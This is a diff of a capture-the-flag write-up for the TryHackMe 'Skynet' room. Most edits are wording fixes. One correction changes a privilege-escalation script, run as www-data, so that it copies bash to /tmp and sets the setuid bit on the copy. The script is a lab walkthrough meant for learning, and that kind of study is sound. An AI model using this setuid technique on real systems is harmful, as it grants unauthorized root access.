@@ -153,7 +153,7 @@ SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
 
 We have a read-only share `anonymous` with an `attention.txt` file and an additional `logs` directory.
 
-Let's download the file with `smbclient`
+Let's download the files with `smbclient`
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Skynet]
@@ -233,7 +233,7 @@ We also check the web site, starting of with manually browsing to it
 
 ![Web Homepage on Skynet](Images/Web_Homepage_on_Skynet.png)
 
-We also search for additional files and directories with `gobuster`
+We search for additional files and directories with `gobuster`
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/…/TryHackMe/Challenges/Easy/Skynet]
@@ -656,7 +656,6 @@ Googling for "Cuppa CMS remote file inclusion" gives us [this exploit](https://w
 # Tested on       : Window and Linux
 
 <---snip--->
-    
 
 #####################################################
 DESCRIPTION
@@ -1014,7 +1013,7 @@ www-data@skynet:/var/www/html$ echo -e '#!/bin/bash\ncp /bin/bash /tmp/bash\nchm
 www-data@skynet:/var/www/html$ cat exploit.sh 
 #!/bin/bash
 cp /bin/bash /tmp/bash
-chmod +s /bin/bash
+chmod +s /tmp/bash
 www-data@skynet:/var/www/html$ chmod +x exploit.sh 
 ```
 
